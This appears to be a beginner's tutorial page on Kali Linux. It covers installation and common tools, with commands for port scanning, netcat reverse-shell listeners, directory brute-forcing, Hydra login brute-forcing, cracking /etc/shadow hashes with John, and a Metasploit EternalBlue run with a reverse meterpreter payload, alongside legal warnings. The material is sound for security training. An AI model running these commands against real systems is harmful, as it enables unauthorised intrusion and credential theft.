🐉 Kali Linux Basics

A beginner-friendly guide to Kali Linux — installation, essential tools, and staying on the right side of the law.

What is Kali Linux?

Kali Linux is a Debian-based Linux distribution purpose-built for penetration testing, security research, and digital forensics. It is maintained by Offensive Security and ships with over 600 pre-installed security tools covering everything from network scanning to wireless attacks to reverse engineering.

Kali follows a rolling-release model, meaning you get continuous updates rather than discrete version upgrades. It is the de facto standard OS for ethical hackers and is used in certifications like the OSCP (Offensive Security Certified Professional).

Legal Warning: Kali Linux is a tool — like any tool, it can be used for good or for harm. Only test against systems you own or have explicit written permission to test. Unauthorised access is a crime under laws like the Computer Fraud and Abuse Act (CFAA) in the US and the Computer Misuse Act in the UK.

Installation Methods

There are three common ways to run Kali Linux. Choose the one that fits your workflow:

  • Live USB via Ventoy — Download the Kali ISO, copy it to a USB with Ventoy, and boot. Nothing touches your hard drive. Great for quick assessments.
  • Full Install — Install Kali directly on bare metal or inside a VM (VirtualBox / VMware). Persistent storage, full performance.
  • Persistent USB — Boot from USB with a persistent partition so your tools, scripts, and settings survive reboots. Best of both worlds.

For most beginners, installing Kali in a VirtualBox VM is the safest and most convenient starting point. Download the VM image from the official Kali site and import it — boot in under a minute.

Essential Tools & Commands

Below are the core tools every Kali user should know. Each is a weapon in its own right — learn them one at a time.

🔍 nmap — Network Mapping & Port Scanning

nmap (Network Mapper) is the Swiss Army knife of network discovery. It can identify live hosts, open ports, running services, and even the operating system of a target.

# Scan the top 1000 ports on a target
nmap 192.168.1.1

# Aggressive scan with OS and version detection
nmap -A -T4 192.168.1.1

# Scan all 65535 ports with service version info
nmap -p- -sV 10.10.10.10

📡 netcat — The TCP/IP Swiss Army Knife

netcat (nc) reads and writes data across network connections. It is used for banner grabbing, port scanning, file transfers, and reverse shells.

# Banner grab — see what service is running on port 80
echo "" | nc -v 192.168.1.10 80

# Set up a listener on port 4444 (useful for reverse shells)
nc -lvnp 4444

# Transfer a file from client to listener
# Listener: nc -lvnp 4444 > received.zip
# Client:  nc 192.168.1.100 4444 < file.zip

📦 Wireshark — Packet Capture & Analysis

Wireshark captures and interactively inspects network traffic at the packet level. Use it to analyse protocols, detect anomalies, or extract files from network streams.

# Capture on interface eth0 and write to file
wireshark -i eth0 -k -w capture.pcapng

# Analyse a pcap file from the terminal with tshark (CLI version)
tshark -r capture.pcapng -Y "http.request" -T fields -e http.host -e http.request.uri

📁 Dirb / Gobuster — Directory Enumeration

These tools brute-force hidden directories and files on web servers by sending HTTP requests using a wordlist.

# Dirb with the common wordlist
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Gobuster is faster and supports more modes
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Gobuster DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt
Tip: Kali ships wordlists under /usr/share/wordlists/. The rockyou.txt.gz file is there — extract it with gunzip /usr/share/wordlists/rockyou.txt.gz.

🔐 Hydra — Brute-Force Authentication

Hydra performs rapid brute-force attacks against network services such as SSH, FTP, HTTP forms, and more. It is paralellised by default and extremely fast.

# Brute-force SSH with a user list and password list
hydra -L users.txt -P pass.txt ssh://192.168.1.10

# Brute-force an HTTP form POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

🔑 John the Ripper — Password Cracking

John cracks password hashes using a variety of modes (dictionary, incremental, Markov). It works with countless hash formats out of the box.

# Extract the hash from a Linux shadow file (combine /etc/passwd and /etc/shadow)
unshadow passwd shadow > hashes.txt

# Crack with the rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

💣 Metasploit Framework — Exploitation

The Metasploit Framework (msfconsole) is the most widely used exploitation framework. It provides modules for scanning, exploitation, payload generation, and post-exploitation.

# Launch the Metasploit console
msfconsole

# Inside msfconsole — search for a module, set options, and run it
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.20
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.100
msf6 > run

Staying Legal

This cannot be emphasised enough. The same skills that make a great penetration tester can land you in prison if misused. Follow these rules:

  • Always get written authorisation before testing any system you do not personally own.
  • Use intentionally vulnerable machines like Hack The Box, TryHackMe, VulnHub, or DVWA to practise legally.
  • Set up your own lab with VirtualBox and deliberately vulnerable VMs (Metasploitable 2/3, Kioptrix, DC-1).
  • Never scan or attack networks outside your lab without explicit permission — even a simple nmap scan can be considered unauthorised access in some jurisdictions.
  • Understand the scope of any engagement. Testing beyond the agreed scope is a breach of contract and potentially a crime.
Ethical hacking is a legitimate and well-paying career. Certifications like the OSCP, CEH, and PNPT validate these skills. Use your powers for good.

Next Steps

Start by setting up a Kali VM and practising with nmap on your local network (your own devices). Then move through each tool one at a time — master nmap before touching Metasploit. Set up a vulnerable VM and work through it methodically. The journey of a thousand shells begins with a single nmap scan.
